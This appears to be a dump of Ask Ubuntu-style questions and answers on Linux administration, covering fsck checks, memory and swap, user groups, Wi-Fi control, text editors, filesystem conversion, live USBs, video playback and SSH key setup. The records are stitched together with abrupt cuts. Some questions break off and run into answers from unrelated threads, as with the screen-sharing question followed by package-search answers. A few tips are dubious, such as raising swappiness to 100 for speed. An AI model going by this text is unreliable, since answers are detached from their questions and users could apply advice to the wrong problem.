What would be the best place to save jar files of libraries I want to use in a project, that are not in any repositories, and how should I set permissions?\nShould I put them in /usr/share/java, or is it better to store them somewhere in my home folder?\nWhat would be the most usefull access rights? Does it make sense to follow the convention in /usr/share/java of making a symlink with the package name to the specific version of the jar, and follow the permissions as used there?\n\nA: If all the users in your system don't need access the files, you can put them in your home folder or even better in bin folder (create one if not already done) under your home folder. That way you have a personal bin directory which can be accessed from terminal without specifying the file extension or the program to open the file.\nFor example,\nmy-app\n\nwould make the terminal to run my-app.any_possible_extension with proper program (Sun's Java or Openjdk in this case). If you create the bin folder, you need to log out and log back in order for the system to recognise the new bin folder. Also, files in the personal bin folder must have been set as executable, otherwise terminal will ignore the file.\n\nA: definately better to keep 'local' changes out of a distribution area.  When you need to upgrade later, you changes won't be removed or the upgrade won't fail because of an errant file.  You just need to change the CLASSPATH environment variable to include the jar files in your home directory.\nSince you are specifying your home directory, I assume that this is a personal project, not one to be published somewhere.  If it a project to be published, then there should be a directory, likely named 'lib', under the project's distribution; for example, /usr/local/xyzzy/lib/*.jar (for the project 'xyzzy').\n", "Q: Toshiba Satellite a300 with Maverick keeps crashing I just installed 10.10 on my girlfriends Toshiba Satellite a300 and for about two days it has been working just fine for two days but today it started acting pretty wonky.\nSeveral times over the machine just dies as if it didn't have a battery and someone yanked out the power supply. After such a crash I'll have to wait a while before powering it up again or it will die before it even reaches the startup screen.\nIt sort of seems like it's reacting to something I do.

Is there a way to find out if a filesystem check is scheduled for the next boot?\nMaybe it's similar to a forced check, which gets triggered by the existence of the file /forcefsck?\n\nA: There's a utility called showfsck that will tell you how many mounts are left until the next scheduled fsck.\n\nA: It depends on your filesystem, in addition to /forcefsck .\nWith ext2, ext3 and ext4 you can use \ndumpe2fs -h /dev/diskname \n\nWhere diskname is for example sda1. You can determine name of your disk partition by running command\nmount\n\nExample output (only partly):\n/dev/xvda1 on / type ext3 (rw,noatime,usrquota,errors=remount-ro)\n\nWhere xvda1 is name of root disk partition.\nFor dumpe2fs three interesting items are\nMount count:              9\nMaximum mount count:      36\nNext check after:         Mon Feb 14 09:31:33 2011\n\nUbuntu will run fsck if mount count is equal or greater than maximum mount count, or if \"next check after\" is passed.\n\nA: Starting in Ubuntu 11.04, this information will be shown in your /etc/motd file, using the tool /usr/lib/update-notifier/update-motd-fsck-at-reboot, which checks ext2/3/4 partitions for both date-based and count-based auto-fsck events. You can run it manually like this:\nsudo /usr/lib/update-notifier/update-motd-fsck-at-reboot --force\n\nand it will report any partitions that will be checked on the next reboot.\n\nA: If you have an ext4 partition you can see how many times it has been mounted:\nsudo dumpe2fs -h /dev/sda1 | grep Mount\n\n", "Q: Trouble Installing Codecs libx264 AND libmp3lame I am trying to use OpenShot for movie making.

I have configured my Ubuntu VirtualBox install to have a base memory setting of 512MB.  When running this install, its fairly sluggish in a way that feels like its thrashing memory.  In other words, it will be fine for a little while and then suddenly run like a pig for a minute or two.  This happens when running a couple of terminals, Eclipse w/ a PyDev Django project, and Firefox, or really any combination of a few applications. \nWhen I look in Windows task manager, the VirtualBox.exe that corresponds to this Ubuntu machine is hovering at about 100MB-120MB.\nWhen I look at System Monitor within Ubuntu, I see that it says for Memory \"329.3 Mib (66.3%) of 496.6 MiB\" and for Swap \"138.6 MiB (38.0%) of 365.0 MiB\".\nSo my first question is, which of these numbers do I believe?  (And why the difference?)\nMy second question is, how can I convince Ubuntu to use the memory I've given it, assuming it will improve performance.\n\nA: VirtualBox.exe shows only ~100MB because it's either swapping to disk in windows (nasty and bad) or because it's forked the service off to some other process that you can't find.\nThe correct tool to see Ubuntu's memory usage is the System Monitor. In your case, it says it is using 329 out of 497 MiB of RAM (this means roughly 345 out of 521 MB). This should be all ram to be honest, considering PAE and how visualisation works.\n\nA: This looks to be a Windows kernel problem.

I have yet another question about \"where is my Linux memory\"\nQuestion goes: can I use cache for application data?\nOn my laptop I have 1GB ram. Situation after some time of work: browser takes 400MB and all other apps caa 300MB (quickly summed in system monitor). System monitor says I use 90% of RAM and I have already 200MB on swap. Laptop is getting slower when I start new things (e.g. open new tab in browser or open new Nautilus window). probably putting memory on swap\nSo there should be 1200MB (ram+swap) used but all app I see uses only 600MB. Where are other 600MB? Out of this 600MB there is 400MB real RAM.\nI am not copying or any other massive IO activity.\nI read about Linux smartly uses all ram it has using buffers and cache. So, kernel (cache) uses 300MB. What if I don't want to have disk mirrored and I want to use memory for application data (e.g. new browser tab)? I don't need 200MB of mirrored disk data, because I (for example) won't use open the same photos on data partition I just seen.\nSo can I use all my RAM for application data? (including browser, desktop, xorg, other services). How?\n\nA: Applications use ram on their own; you don't have to DO anything.  Whatever ram ISN'T in use by applications is used to cache recently accessed files to speed things up if they are needed again, thus between the two, ram usage is usually close to 100%.  As applications request more ram, the cache gives it up.\n\nA: Try setting the swapiness to 100, it should improve performance in your machine and avoid freezes by making a more intensive usage of the swap, keeping only what is active on memory.\nSee here how to do :\nhttps://help.ubuntu.com/community/SwapFaq#What%20is%20swappiness%20and%20how%20do%20I%20change%20it?\n", "Q: What do the groups do in \"Users and Groups\"? I know that some define permissions on the file system (such as www-data).  But I don't understand why this question was answered successfully by adding a user to the \"Video\" group.\nSo the question is mainly what do all the pre-built groups do in Ubuntu?  More reasonably, since there are so many, what \"special\" groups exist and how or when should they be used?\n\n\nA: Some groups allow access to files or directories, for example: the www-data allow the access to web files or the adm group to read files in /var/log. This is the trivial use.\nBut some groups allow access to certain devices. For example the dialout group allows access to the serial ports via files in /dev:\n$ find /dev -group dialout -exec ls -ld {} \\;\ncrw-rw---- 1 root dialout 4, 64 Jan 19 12:51 /dev/ttyS0\ncrw-rw---- 1 root dialout 4, 67 Jan 19 12:51 /dev/ttyS3\ncrw-rw---- 1 root dialout 4, 66 Jan 19 12:51 /dev/ttyS2\ncrw-rw---- 1 root dialout 4, 65 Jan 19 12:51 /dev/ttyS1\n\nSo if you are member of the dialout group you can use the serial ports by reading and writing to the device file: echo \"Hello world\" > /dev/ttyS0. The video group allows access to the video hardware.\nFor description of each groups, read the file: /usr/share/doc/base-passwd/users-and-groups.html\nEDIT about first comment:\nIn fact, usually you don't have to be in those groups to \"access\" the hardware resources, from a user point of view. The common practice is to have a daemon/server managing it, being member of the most restrictive group, then allowing you access to the daemon/server.\nFor your case, being member of the video group allows direct access to the graphic hardware, not through the X server. Usually on desktop/laptop computer it is nice to have direct access to the graphic hardware (glxinfo | grep \"direct rendering\").\nSide note, if you have direct rendering but you are not member of the video group (id | grep --color video), you were allowed hardware access by an acl of the /dev file (find /dev/ -group video -exec getfacl {} \\; | grep $USERNAME).\n\nA: In general the concept of group separation relates to this:\nhttp://en.wikipedia.org/wiki/Principle_of_least_privilege\nIt does seem silly to have all of those groups until you realize the alternative would be a single common level of high privilege (ex. sudo/root) which would be a security nightmare.\nMost of the groups shown in your post exist so that various pieces of the OS can access common functionality with the least amount of privileges.  The user shouldn't have to worry about this too much.  During some administrative tasks you may need to up your privs to access some functionality and this is usually done using sudo for short one time tasks and by adding yourself to a specific group for repetitive tasks.  \n", "Q: When are \"User Privileges\" relevant? I notice that many of the user privileges in \"Users and Groups\" are not ticked on my user, but I still have access to the items they specify.  For example, I'm constantly using VirtualBox for virtualisation, I can connect to wireless and wired networks and I can plug in and use any audio device.\nWhen are these privileges honoured?  How useful are they?\n\n\nA: There is no one answer to this question, as each permission has it's own effects. Most of that \"privileges\" means that you are a member of some group. This will usually let you access to files owner by that group. Remember that in most unix-like systems everything is a file.\nNow, one answer:\n\"Use VirtualBox virtualization solution\" likely means that you are member of the vboxusers group. You will need to be member of this group to be able to use usb devices on VirtualBox. If you are not member of this groups, all the devices on the USB menu on VirtualBox should be greyed.\n\nA: Most of these options are \"legacy\" and have been replaced by tools like ConsoleKit and PolicyKit for managing what users are allowed to do and when.\n\nA: You might have been asked pass whenever you try one of these through ask pass which means you are using sudo command to perform that action as a different user\n", "Q: Share Screen with Multiple Viewers?

If you cannot find the program by it's package name, try the \"package contents\" option in the search box on the right side at packages.ubuntu.com. Search for \"djvused\" in package contents.\nIf a program is relatively new, and no package exist in the Ubuntu repositories, you could try to find one using PPAs (=Personal Package Archives).\n\nA: Sometimes an application is installed part of a meta-package or with another name. This makes it hard to find from Synaptic. A good place to start searching is the Packages Ubuntu archive where all packages provided are listed.

I have to switch it off and on again on the applet to switch it on again, when I switched it off from the console. \nIs there a better way? \nThis is what the syslog looks like when I switch wireless off and on again from the network manager:\nNetworkManager: <info>  (eth1): device state change: 3 -> 2 (reason 0)\nNetworkManager: <info>  (eth1): deactivating device (reason: 0).\nNetworkManager: <info>  Policy set '24' (eth0) as default for routing and DNS.\nNetworkManager: <info>  (eth1): taking down device.\navahi-daemon[660]: Withdrawing address record for fe80::202:8aff:feba:d798 on eth1.\nkernel: [  971.472116] airo(eth1): cmd:3 status:7f03 rsp0:0 rsp1:0 rsp2:0\n\n\nNetworkManager: <info>  (eth1): bringing up device.\nNetworkManager: <info>  (eth1): supplicant interface state:  starting -> ready\nNetworkManager: <info>  (eth1): device state change: 2 -> 3 (reason 42)\navahi-daemon[660]: Registering new address record for fe80::202:8aff:feba:d798 on eth1.*.\nkernel: [  965.512048] eth1: no IPv6 routers present\n\n\nEDIT C: It works somehow now, but in a hacky way, not very nice. I added a line to rc.local, just before exit 0:\n$ cat /etc/rc.local \n#!/bin/sh -e\n\n# turn off wifi on boot:\nifconfig eth1 down\n\nexit 0\n\nWhen I start the machine, wifi comes up, and after an instance it is turned off. This must be the effect of the standard configuration of ubuntu that turns it on, then my script ifconfig eth1 down kicks in and turns it off. And network manager does not realize that it was turned off and thinks it is still on.\nIt would be desirable to configure network manager's so that the standard state when turning on the machine can be on or off, and not only on\n\nA: You can turn off Wifi using rfkill:\nsudo rfkill block wifi\n\nTo turn it on again, run:\nsudo rfkill unblock wifi\n\nSee my answer on How can I keep a wireless card's radio powered off by default?.\n", "Q: Text editor with syntax highlighting, theme support and code folding I like Notepad++ under Windows.

It was hard making the shift to \"nowhere land\" after knowing exactly how to do things in Npp,  but I've gradually discovered that with the right plugins and a few personal scripts which you can easily add via the External Tools plugin, that gedit is the easiest and best transitional editor for hard-core ex- Npp users. I feel your pain ;) \nAfter 4 months of Linux, I'm starting to get a good feel for things, and I'm branching out to GNU emacs because it leaves Npp standing still (really Npp's regex sucks!)  I've tried gvim and it seems very good too, but a few things about emacs gel better with me... \ngedit with plugins is quite a good choice once you get to realize that this Ubuntu thing is a whole new world... so you need a matching editor... I've got Npp installed in wine for a sense of security, but I virtually never use it anymore, because gedit is basically just as good... and GNU emacs and Gvim are better (but they have a big learning curve) go for gedit.\nYou may be interested in running Notepad++ in wine (I was)... so here are some notes I've put together about the bugs I've found using Notepad++ in wine... \n\n\n*\n\n*notepad++ - Wine-BUGS - Ubuntu.10.04\n\nA: I love gEdit. Is not nearly as powerful as NotePad++, but its ultra-lightweight, and the default text editor in Ubuntu (or any other Gnome distro). It has a huge list of templates for syntax coloring. And be sure to download its gedit-plugins companion, it shines even more.\nAlso, you might consider geany. It's meant to be a more than just a text editor, it's actually a multi-language IDE. But since it's so simple, easy-to-use one, and lightweight, it could be considered a good editor alternative. And its in the official repos.\nI would say that NotePad++ (I used it for years in my former job) would stand between geany and gedit, in terms of features. So I gave you a \"little less than\" and \"a little more than\". Pick any ;)\n\nA: I love geany for its simplicity and plugins \nsudo apt-get install geany geany-plugins\n\n\nA: I've been using the Sublime Text 2 alpha on Ubuntu and enjoy it a lot. It's nice to have the same editor across multiple OS's\n\nA: I prefer Komodo.\n\nA: You can use KDE's Kate, it is very powerful (search for it in ubuntu software manager). Also if you want to pay for powerful text/html/programming editor, you can use UltraEdit LX. It has more features than Kate.\n\nA: I didn't see gui or cli specified, so I'll throw out a few.\nThere is a rather steep learning curve, but learning the basics of emacs/vim is useful. Chances are you will have to use them at some point.\nI like Netbeans for java, but it will do php/python/c/c++/etc. Eclipse will do as well.\n\nA: I would think gedit would be perfect.   It is on Ubuntu by default, is easy to use, and can be extended with plugins.\nThat being said, since notepad++ is based on scintilla, scite  is probably worth checking out.   Scite is based on scintilla as well, though as fred.bear points out, it might be less feature-rich than you need.\nHere are a couple more:\njEdit\njedit - A plugin-based editor for programmers\n\njEdit is a powerful open source editor\n[...]  unlimited undos/redos,\nsyntax highlighting for more than 130\nfile formats, markers for fast and\neasy navigation, online help, bracket\nmatching for programming languages as\nwell as auto-indent. Plugins can be downloaded and installed from within jEdit using the \"plugin manager\" feature.\n\n\nvim / gvim / cream\ngvim  or cream - VI IMproved, with optional VIM macros that make the VIM easier to use for beginners\n\n\nA: Notepad++ is arguably the best editor for Windows. Now you can install it in Ubuntu via Wine:\nInstall Notepad++ in Ubuntu 12.04 \n\nA: No one mentioned the leafpad. The more I use it, The more I like it. Though, It has not that many features, but it is extremely resource-saver.\nInstallation from terminal: sudo apt-get install leafpad.\nInstallation from Ubuntu software center: Clicking this will do the job\n\nA: I use Kate, because I like these features of it:\n\n\n*\n\n*Very handy quick search (exactly like Firefox)\n\n*Code completion (using exciting code in current document)\n\n*Snippets\n\n*Integrate easily with terminal and file manager\n\n*Installable on Mac and Windows\n\n*Code highlighting\n\n\nA: I'd like to add two less known but very powerful and feature-rich text editors to this list of recommendations:\nKKEdit\nhttp://www.webupd8.org/2014/03/kkedit-text-editor-inspired-by-bbedit.html\nhttp://linux-apps.com/content/show.php/KKEdit?content=158161\n\n*\n\n*The usual source view options, split-view, line wrap, line numbers etc.\n\n*Full source code highlighted printing.\n\n*Standard text search OR regex search in current or all open files.\n\n*Jump to function declaration, Find Function declaration.\n\n*Find API declarations in installed Gtk-Doc's.\n\n*Find and open include file.\n\n*Multiple bookmarks.\n\n*Run external tools.\n\n*Save/Restore session.\n\n*Run external tool synchronously or asynchronously.\n\n*Pass selected text to external tools.\n\n*Spell checking via ASpell, check selected word or check document via tab menu.\n\n\nmedit \nOfficial site\n\n*\n\n*Configurable syntax highlighting.\n\n\n*Configurable keyboard accelerators.\n\n\n*Multiplatform - works on unix and windows.\n\n\n*Plugins: can be written in C, Python, or Lua.\n\n\n*Configurable tools available from the main and context menus. They can be written in - Python or Lua, or it can be a shell script.\n\n\n*Regular expression search/replace, grep frontend, builtin file selector, etc.\n\n\nA: gedit will be the best for you as it is lightweight yet powerful. If sometime in the near future you wish to upgrade to ide level capabilities, then consider emacs or vim.\n", "Q: Acer Aspire One and Kernel 2.6.35-25 Freeze I'm having a problem with an Acer Aspire One netbook after the latest kernel upgrade. Basically, doing anything relating to an external monitor locks the trackpad, and in some cases, the keyboard as well. This lock will continue in Gnome even after reboots, and requires battery removal to fix. It does work in the graphical login manager up until the problem occurs the first time. And ideas on settings, etc, that I can change to make it work again?\n\nA: use 2.6.35-24\nhttps://bugs.launchpad.net/ubuntu/+source/linux/+bug/703553\n", "Q: What is needed to see NAS drive? If I use Windows XP the drive is seen in the network it is not seen in ubuntu's network.\nI do know and can use Connect to a Server but the question is really not about that.

If I change my home from ext3 to ext4 when installing will my data be lost?\n\nA: Yes.  And you should be able to see that because the format box will automatically be checked.  If you want to enable the two main features of ext4 that can be added without reformatting, run sudo tune2fs -O extents,uninit_bg /dev/sda1 and then sudo e2fsck -f /dev/sda1.\n\nA: Where do you want to change it? As far as I can imagine, if you install new version of ubuntu, any selection about a new file system means destroying the previous. Since you mentioned \"my home\" (I am not sure you mean that /home is mounted as a separated filesystem), if I were you, I would simply skip using that fs, and later, you only need to edit /etc/fstab to mount your \"old\" /home. Note: if you choose ext4 fs there (but /home was ext3) this means some kind of \"conversion\" from ext3 to ext4 then (ext3 can be mounted az ext4, but if you do this even only at once, you can't \"revert\" it easily ...).\n\nA: if you want your old ext3 partition to become ext4 you can easily convert it after you are done upgrading:\ntune2fs -O extents,uninit_bg,dir_index /dev/sdb1\nwhere /dev/sdb1 your 'home' partition, which has to be unmouned sudo umount /dev/sdb1 prior running the command. \nbeware though that, as LGB mentioned, reverse conversion is not so trivial.\n\nA: Not much to add as the how to has been said already. However consider this:\nBefore changing the filesystem on a preexisting partition it is strongly recommended to backup your data.\nIn the likely case that you already made your backup you may run the tools mentioned by psusi, or else you may find it less time consuming to simply restore your data in a brand new /home.\n", "Q: Tell Launchpad what DEB_BUILD_OPTIONS to use when building PPA package When I generate and upload source packages to my PPA, what's the best way to pass DEB_BUILD_OPTIONS that Launchpad will use when building binary versions of the package? \nIn particular, I want to pass in the \"nodocs\" option so that the documentation isn't built. \n\nA: The PPAs do not have a way to specify an environment variables (including DEB_BUILD_OPTIONS) unfortunately. Until they do, you will need to edit the debian/rules file and set it manually yourself near the top (but not the first line if it uses a \"#!\"):\nDEB_BUILD_OPTIONS=nodocs\n\nOptionally, just find the section of the rules file that looks for \"nodocs\" and change it to do what you need it to do.\n\nA: Set it in your debian/rules file.\n", "Q: Problems building clamcour when i try to install clamcour from terminal, it gives me  this error, somebody can help me?\ncalmcourdir# ./configure\n\nchecking for libraries containing socket functions... -lc\nchecking for socket... yes\nchecking for bind... yes\nchecking for listen... yes\nchecking for accept... yes\nchecking for shutdown... yes\nchecking for socklen_t... yes\nchecking for struct sockaddr_un.sun_len... no\n\n\nSystem log functions\nchecking syslog.h usability... yes\nchecking syslog.h presence... yes\nchecking for syslog.h... yes\nchecking for openlog... yes\nchecking for syslog... yes\nchecking for closelog... yes\n\n\nTime functions\nchecking whether time.h and sys/time.h may both be included... yes\nchecking whether struct tm is in sys/time.h or time.h... time.h\nchecking for localtime_r... yes\nchecking for strftime... yes\nchecking for unistd.h...

For the purposes of kernel logging, why do I have three different, non-inclusive levels of logging amongst /var/log/messages, /var/log/syslog, and /var/log/kern.log?\n\nA: Syslog is a standard logging facility. It collects messages of various programs and services including the kernel, and stores them, depending on setup, in a bunch of log files typically under /var/log. In some datacenter setups there are hundreds of devices each with its own log; syslog comes in handy here too. One just sets up a dedicated syslog server which collects all the individual device logs over the network. Syslog can also save logs to databases, and other clients.\nAccording to my /etc/syslog.conf, default /var/log/kern.log captures only the kernel's messages of any loglevel; i.e. the output of dmesg.\n/var/log/messages instead aims at storing valuable, non-debug and non-critical messages. This log should be considered the \"general system activity\" log.\n/var/log/syslog in turn logs everything, except auth related messages.\nOther insteresting standard logs managed by syslog are /var/log/auth.log, /var/log/mail.log.\n\n2020 update\nYou may still stumble upon syslog; but the defaults have changed.\njournald has replaced syslog, in quite a big portion of systems, including Ubuntu.\nThis is relevant because you won't be finding /var/log/messages that often anymore. journald doesn't write plaintext logs — it uses its own, compressed and partially authenticated format.\nSearch online for e.g. journalctl cheatsheet, or just study man 8 systemd-journald, man 1 journalctl yourself.\nSyslog and journald are, to a degree, cross-compatible; you can transport logs between them in either direction. However, you won't get plaintext logs a-la /var/log/messages with journald; and you won't get structured (journalctl -o json-pretty) and authenticated logging with syslog.\n\nA: *\n\n*syslog contains all the messages except of type auth.\n\n*messages contains only generic non-critical messages. The category is info , notice and warn\n\n*For complete log look at /var/log/syslog and /var/log/auth.log\n\n*AFAIK /var/log/kern.log contains kernel messages.\n\n*log files are just a convention spelled out in /etc/syslog.conf\n\n*read syslog(3) for more information\n\n\nCheck this page about differences between messages and syslog\nit says /var/log/messages ⊂ /var/log/syslog\n", "Q: What is a good card creating application?

My gut says disabling write cache on soft RAID5 is the smart move, but I'm not certain.\nPossible Considerations:\n\n\n*\n\n*The drives a WD20EARS with 64Mb cache.\n\n*The server hasn't gone down due to a power outage in the last 4-5 years.

Basically, you can get your whole array destroyed unrecoverably (or actually, it is possible to recover, but it is huge mess). We had that case earlier when battery backup for write caches failed (raid card memory backup), and it wasn't nice.\nDisabling\nCons: small performance hit for writing.\nPros: your data is safer.\n\nConsiderations\nYour usage looks like mainly reading (you aren't adding new CD's/DVD's all the time, are you, same goes for family photos etc.). Is it important to have little bit more performance for writing?\nHow long it will take to rip all data again, and restore all backups in case of failure? If that is trivial amount of time (or someone else will do it :)) go for it, but if you really do not want to do that, I would skip adding small performance improvement.\nAlso, you can enable write cache temporarily, and run some benchmarks, for example bonnie++ or just copy'n'paste some files to disk to see if there is any advantage.

The Problem is that Windows' partitions need to be the first on the disc because Windows' boot system looks for the first active partition on your hard drive, so if you put Ubuntu at first it will try to boot Ubuntu and it's Windows boot system, sure that it will fail.\nWhat to do:\n\n\n*\n\n*Organize Windows partitions:\n\n\n*\n\n*Boot on Win7 and defragment it's partition ( it may take time ):\n\n\n*\n\n*Open Disk Defragmenter ( Start> All Programs> Accessories> System Tools> Disk Defragmenter ), select the drive to be defragmented and click on the Defragment Disk button.\n \n\n\n*Open Disk Management ( In the Control Panel search box type \"partition\", then click in the link “Create and Format Hard Disk Partitions” under Administrative Tools ) \nthen delete WinXP partition and move Win7 partition to the begining of the hard drive.\n\n\n\n*Install Ubuntu:\n\n\n*\n\n*Boot through the Ubuntu Live CD and choose \"Try Ubuntu\" when prompted.\n\n\n\n\n\n*\n\n*Wait for the desktop to load and open Gparted ( System > Administration > GParted )\n\n\n\n\n\n*\n\n*If there already is a free space after Win7 partition simply click on the Unallocated Space and create a new partition to Ubuntu, if the Windows partition is occupying the whole disk you will need to resize it to free space to the new Ubuntu partition.\n\n\n\n\n\n*\n\n*Then you just need to install Ubuntu into the new partition.\n\n\n\nA: I would try to remove the Windows XP partition first and then select the option \"Use the largest continuous free space\".\nOne way to delete the XP partition is to boot the Ubuntu livecd and select \"Try Ubuntu\", than start GParted from System > Administration. Inside GParted select the partition and delete it, than apply changes. Be warned thought; this will remove everything in that partition.\nHope this helps!\n/Linus Unnebäck\n", "Q: How do I install Ubuntu from an USB drive / create a live USB-stick in Windows? I tried to use the usb-creator.exe from Ubuntu 10.10 desktop i386 ISO image and it does create an USB stick that doesn't boot. When I try to boot from it I get:\n\nOperating System not found.\n\nI try to do this from Windows 7 x64. I'm not looking to create a live Ubuntu media, only an installation USB disk.\nI repeated the process several times and I even tried to reformat the USB drive (FAT32), no success yet.\nThe USB stick is a 8GB one.\n\nA: I like the Universal USB installer. Download it from here\nThen run the program double-clicking it with admin privilege. The program will run and you have to direct it to the downloaded iso file. Here is a screenshot below (credit goes to the site owner)\n\nPlease take caution to select the actual drive letter of the USB drive. \n\nNow restart your PC to boot from the USB drive\n\nA: There are lot of programs, \nMy personal Fav: \n\n\n*\n\n*LILI\n\n*Universal usb installer\n\n*Unetbootin\nAll does same to create the usb from windows machine.\nYou point to the ISO, choose the usb and start. They will prepare the USB in 5-10 min.\n\nA: Quoted: The recommended way to install Ubuntu from a USB flash drive is to use the usb-creator program, point it at a ISO image of a Ubuntu installation CD that you have downloaded, and let it create a bootable USB that you can use instead of the CD. \nSource: Ubuntu\nBelow you can find more information that can help you in your process.\nInstallation/FromUSBStick\n\nUNetbootin\nHow to Put Ubuntu on a USB Thumb Drive\n\nA: Well you can create a Live-USB disk that can be used for installing the operating system with unetbootin. Here is the official documentation on USB installation.\nMake sure that you boot the USB disk at system startup, i.e. when you on your computer. That means the BIOS of your computer has to be set to try to boot from USB before it boots from hard drive and the stick has to be inserted before hard drive booting takes place.\nThe usual procedure from within Ubuntu is to use Startup Disk Creator. With that you just select the Ubuntu image or LiveCD and the USB-Media and go ahead. See picture below:\n\n\nA: From what I see, you have downloaded an ISO file and burnt it to a USB stick. In other words, you have created a liveUSB. And, you expect it to install Ubuntu inside of Windows 7. That is only possible if you have downloaded a WUbI installer. To install Ubuntu using a WUbI, you can follow this link.\nIf you are trying to install using a LiveUSB, check how to boot from USB for a better idea.\n\nA: I recommend UNetbooting, you can read about it and others here:\nhttp://www.webupd8.org/2009/04/4-ways-to-create-bootable-live-usb.html\nAlso, Ubuntu has a program installed by default called 'Startup Disk Creator'. This works great for installing Ubuntu (and derivatives) onto a USB.\n\nA: I prefer using Startup Disk Creator on the Live CD, (or usb-creator for Windows, extracted from the Ubuntu iso).\nUnetbootin should also work if the version is up to date.\nThe first thing you should do with either, is check the MD5SUM of the downloaded iso to confirm the download was not corrupted.\nIf the MD5SUM checks out try the Live USB on a second computer. \nSome computers just will not boot Ubuntu.\n\nA: Get a pendrive 8gb or larger then:\n\n\n*\n\n*Partition using GPARTED on LiveCD. 4GB / - 3gb home rest for swap.\n\n*Grub on sdx (first partition of your pendrive) \n\n*Install on usb.\n\n*Configure your bios to boot from usb. \nIf you have fast usb 3.0 pendrive it should be quite quick and work fine.\n\n\nIf you need any further details/how to explanations, please ask ahead in the comments.\n\nA: Set to boot from USB in BIOS. that is if you haven't set to it.\n", "Q: How to disable samba shared folder password prompt I have shared a samba folder on ubuntu desktop.

I've tried to play it with others video players but it is the same. \nI think that is a 10gb .mkv file with 10Gb. Stuttering video with VLC , mplayer, and the default video player on ubuntu.\nI read in many Forums just can´t put this to work.\nAny idea? thanks.\nUbuntu 10.10, \n\n\n*\n\n*My PC specs: \n\n*Single Core 2Ghz\n\n*ATI HD 4350 (i have installed the drivers from \"Hardware Drivers\"), \n\n*2G Memory\n\n\n*EDIT: Problem solved, this weekend had buy a motherboard and a processor DualCore 2.5Ghz, no more stuttering. thanks alot for your help.\n\nA: Try it on any other operating system with this specs and it will choke. Some Single Core 2 Ghz can't handle even 720p but 1080p it's a sure...\nI have a PC: Athlon 3000+, Single Core 2 Ghz, ATI Radeon 4850 HD(1GB ; 512 bit) with big bandwidth and it chokes too... Overclocked to 2.4 Ghz and anyway chokes for 1080p(Blu-Ray).\nBtw, try to compile the new kernel(2.6.38-rc4) it gives awesome performance boost(I don't know if it gives the boost for Single Core, for Multi-Core for sure but anyway, u may wanna try): https://wiki.ubuntu.com/KernelTeam/GitKernelBuild .If u want to compile the Kernel, don't forget that u need at least 7GB disk space.\n\nA: My guess is the video is stuttering because it's trying to decode it entirely on the CPU.  Even a fairly beefy CPU will have to work very hard to play a full 1080p video stream.  GPU-accelerated video playback is much less taxing.\nI have an Nvidia card using VDPAU with the proprietary driver, so I'm not sure what options there are for hardware accelerated video on ATI cards.  First thing you should do is confirm your video hardware is even capable of video playback acceleration... models older than 2 years may not.  Second, make sure you're using a driver that supports it - it's possible the ATI open source driver supports it even if the (better performing?) proprietary one doesn't.  Lastly, you'll need a build of your media player software that is confirmed to make use of the appropriate video acceleration API - I recall that the mplayer in the repos for releases of Ubuntu before 10.10 didn't have VDPAU support, and it was a pain to track down which features that binary actually supported.\nI googled \"ati linux hardware accelerated video\" (minus the quotes) and came across a few things, but nothing conclusive.  Maybe an ATI user can chime in here with some help.\nI would suggest editing the title of your question to be more descriptive, something like \"Slow Blu Ray video playback on Boxee hardware\".\n\nA: You might want to try using the open source driver instead of the proprietary ATI \"Hardware Driver\". In my experience the open source driver does a MUCH better job playing videos and the proprietary ATI driver can not even play DVDs smoothly.\n\nA: I solved the problem using XBMC instead of VLC. I really can't tell you why this works, but with vlc the hd-videos stuck all the time, XBMC seems to work much faster.\n\nA: For VLC see some of the optimisations here, focused on Nvidia but should help for ATi too. VLC's HD GPU-based decoding I believe is still a little experimental.\n\nA: Install sudo apt-get install xvba-va-driver libva-glx1 libva-x11-1 vainfo and command vainfo should give you \nlibva: libva version 0.32.0\n     Xlib:  extension \"XFree86-DRI\" missing on display \":0.0\".\n     libva: va_getDriverName() returns 0\n     libva: Trying to open /usr/lib/dri/fglrx_drv_video.so\n     libva: va_openDriver() returns 0\n     vainfo: VA API version: 0.32\n     vainfo: Driver version: Splitted-Desktop Systems XvBA backend for VA-API - 0.7.8\n     vainfo: Supported profile and entrypoints\n     VAProfileH264High               :  VAEntrypointVLD\n     VAProfileVC1Advanced            :  VAEntrypointVLD\nOpen up vlc and enable GPU acceleration under inputs and codecs.\n", "Q: How to generate a private-public key using ssh-keygen and make it authorized? I want to generate a public-private key on Sever 1 and store it in a location which is not the default location.\nThereafter, save the public key on Server 2; once again NOT at the default location.\nThen make this key an authorized key.\nHowever, I cannot find authorized_keys file in ~/.ssh folder. How do I make it authorized?\n\nA: *\n\n*Run ssh-keygen -f filename.\n\n*Run scp filename username@server:filename-on-server\n\n*Log in to the server and run cat filename-on-server >> ~/.ssh/authorized_keys\nYou could also replace steps 2 and 3 with ssh-copy-id -i filename username@server.\n\nA: Sounds like you've already made the keys. If not, just run ssh-keygen and accept the defaults. Make the authorized_keys file yourself: touch authorized_keys\nWhen you keep your private keys in a non-standard location, make sure and use -i: ssh -i /path/to/privatekey user@host\nHere's a good article on ssh-keygen and using authorized_keys to simplify ssh logins:\nhttp://www.debuntu.org/secure-your-ssh-server-with-publicprivate-key-authentification/\n\nA: Use ssh-keygen command. On the server (where you want ssh to) store the  public key in file ~/.ssh/authorized_keys. If you haven't got an .ssh directory inside your home (~) yet, create it (also be careful: it seems sshd is picky - for security reasons - that no other user can read that file/dir, it's better to issue chmod 700 on your .ssh directory and chmod 600 on the file in it). \nOn the machine you want to ssh from (\"client\"), you can use the private key to ssh to your server then. You can store it anywhere then you can use the -i switch of ssh, to give the public key which will be used. I write this, since you stated that \"not storing at the default location\". The default location would be file id_dsa (for DSA key) inside your .ssh directory. Then you don't need the -i switch to specify your key, because it will be picked from there automatically.\n", "Q: 50-synaptics.conf options not working How does Ubuntu come up with the default synaptics settings? I've got Ubuntu Netbook 10.10 installed on an Eeepc 900. Out of the box TapButton2 was set to 3, and TapButton3 was set to 2.\nI have several custom synaptics settings I want as system wide defaults.

